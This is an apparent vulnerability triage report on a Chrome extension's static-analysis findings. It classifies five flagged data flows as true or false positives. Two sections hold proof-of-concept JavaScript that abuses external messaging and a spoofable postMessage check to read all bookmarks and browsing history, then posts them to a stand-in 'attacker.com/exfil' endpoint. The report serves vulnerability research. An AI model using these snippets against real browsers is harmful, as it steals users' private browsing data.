# CoCo Analysis: kankhbhekghfgkfbeafcahgnpgnniajg

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 3 distinct vulnerability types

---

## Sink 1: BookmarkTreeNode_source → sendResponseExternal_sink

**CoCo Trace:**
```
$FilePath$/Users/jianjia/Documents/COCO_results/all/1k_9k/kankhbhekghfgkfbeafcahgnpgnniajg/opgen_generated_files/bg.js
Lines 790-817: BookmarkTreeNode mock object creation
```

**Classification:** FALSE POSITIVE

**Reason:** All line numbers reference CoCo's framework mock code (BookmarkTreeNode constructor starting at line 790), not actual extension code. This is CoCo's synthetic model of the chrome.bookmarks API, not a real vulnerability in the extension.

---

## Sink 2: bg_chrome_runtime_MessageExternal → BookmarkSearchQuery_sink

**CoCo Trace:**
```
$FilePath$/Users/jianjia/Documents/COCO_results/all/1k_9k/kankhbhekghfgkfbeafcahgnpgnniajg/opgen_generated_files/bg.js
Line 1277: searchBookmarks(request.query).then(res => {
```

**Code:**

```javascript
// Background script - External message handler (bg.js)
chrome.runtime.onMessageExternal.addListener(listener);

function listener(request, sender, sendResponse) {
    switch(request.event) {
        case EVENTS.SEARCH_BOOKMARKS:
            searchBookmarks(request.query).then(res => { // ← attacker-controlled query
                sendResponse(res); // ← bookmarks returned to external caller
            });
            break;
        // ... other cases
    }
}

function searchBookmarks(query) {
    return new Promise((resolve, reject) => {
        chrome.bookmarks.search(query, (res) => { // ← query used in bookmark search
            resolve(res);
        });
    });
}
```

**Classification:** TRUE POSITIVE

**Exploitable by:** Only `*://abcdpdf.com/*` (per externally_connectable in manifest)

**Attack Vector:** External messages from abcdpdf.com domain

**Attack:**

```javascript
// From https://abcdpdf.com/* webpage:
chrome.runtime.sendMessage(
    'kankhbhekghfgkfbeafcahgnpgnniajg',
    { event: 'SEARCH_BOOKMARKS', query: '' }, // ← empty query returns all bookmarks
    (bookmarks) => {
        console.log('Leaked all user bookmarks:', bookmarks);
        // Exfiltrate to attacker server
        fetch('https://attacker.com/exfil', {
            method: 'POST',
            body: JSON.stringify(bookmarks)
        });
    }
);
```

**Impact:** Information disclosure - external domain (abcdpdf.com) can search and retrieve user's browser bookmarks, including private URLs and bookmark structure.

---

## Sink 3: HistoryItem_source → sendResponseExternal_sink

**CoCo Trace:**
```
$FilePath$/Users/jianjia/Documents/COCO_results/all/1k_9k/kankhbhekghfgkfbeafcahgnpgnniajg/opgen_generated_files/bg.js
Line 734: var HistoryItem mock object
```

**Classification:** FALSE POSITIVE

**Reason:** References CoCo framework mock code (HistoryItem at line 734), not actual extension code. However, similar to Sink 2, there IS a real vulnerability for history search.

---

## Sink 4: bg_chrome_runtime_MessageExternal → localStorage_setItem_value

**CoCo Trace:**
```
$FilePath$/Users/jianjia/Documents/COCO_results/all/1k_9k/kankhbhekghfgkfbeafcahgnpgnniajg/opgen_generated_files/bg.js
Line 1305: if (request.status && request.account) {
Line 1306: localStorage.setItem('account', JSON.stringify(request.account));
```

**Code:**

```javascript
// Background script - External message handler (bg.js)
function listener(request, sender, sendResponse) {
    switch(request.event) {
        case EVENTS.SET_USER_STATUS:
            if (request.status && request.account) {
                localStorage.setItem('account', JSON.stringify(request.account)); // ← attacker-controlled data
            }
            break;
    }
}
```

**Classification:** FALSE POSITIVE

**Reason:** This is incomplete storage exploitation. While external messages can write to localStorage, there's no evidence of a retrieval path that returns this data to an attacker-accessible output (sendResponse, postMessage to attacker domain, or fetch to attacker URL). The stored data is only used internally by the extension. Per methodology, incomplete storage exploitation (storage.set only without get → attacker-accessible output) is a FALSE POSITIVE.

---

## Sink 5: cs_window_eventListener_message → BookmarkSearchQuery_sink

**CoCo Trace:**
```
$FilePath$/Users/jianjia/Documents/COCO_results/all/1k_9k/kankhbhekghfgkfbeafcahgnpgnniajg/opgen_generated_files/cs_0.js
Line 571: window.addEventListener('message', function (e) {
Line 572: if (!e.data.from || e.data.from != '__newtab') { return false; }
$FilePath$/bg.js
Line 1277: searchBookmarks(request.query).then(res => {
```

**Code:**

```javascript
// Content script (cs_0.js) - runs on <all_urls>
window.addEventListener('message', function (e) {
    if (!e.data.from || e.data.from != '__newtab') { // ← attacker can set this
        return false;
    }

    chrome.runtime.sendMessage(e.data, (res) => { // ← forwards to background
        const sender = {
            event: e.data.event,
            res: res // ← sends response back to page
        };
        sendMessage(sender);
    });
});

function sendMessage(sender) {
    sender.from = 'ext';
    window.postMessage(sender, '*'); // ← posts back to webpage
}

// Background script handler
function listener(request, sender, sendResponse) {
    switch(request.event) {
        case EVENTS.SEARCH_BOOKMARKS:
            searchBookmarks(request.query).then(res => {
                sendResponse(res); // ← returns bookmarks
            });
            break;
        case EVENTS.SEARCH_HISTORY:
            searchHistory(request.query).then(res => {
                sendResponse(res); // ← returns history
            });
            break;
    }
}
```

**Classification:** TRUE POSITIVE

**Exploitable by:** Any website (content script runs on `<all_urls>`)

**Attack Vector:** window.postMessage

**Attack:**

```javascript
// From any malicious webpage:
window.postMessage({
    from: '__newtab', // ← bypass the check
    event: 'SEARCH_BOOKMARKS',
    query: '' // ← empty query returns all bookmarks
}, '*');

// Listen for response
window.addEventListener('message', (e) => {
    if (e.data.from === 'ext' && e.data.event === 'SEARCH_BOOKMARKS') {
        console.log('Stolen bookmarks:', e.data.res);
        // Exfiltrate to attacker server
        fetch('https://attacker.com/exfil', {
            method: 'POST',
            body: JSON.stringify(e.data.res)
        });
    }
});

// Similarly for history:
window.postMessage({
    from: '__newtab',
    event: 'SEARCH_HISTORY',
    query: ''
}, '*');
```

**Impact:** Critical information disclosure - any website can retrieve user's complete browsing history and bookmarks by bypassing the weak `from: '__newtab'` check (which attacker fully controls).
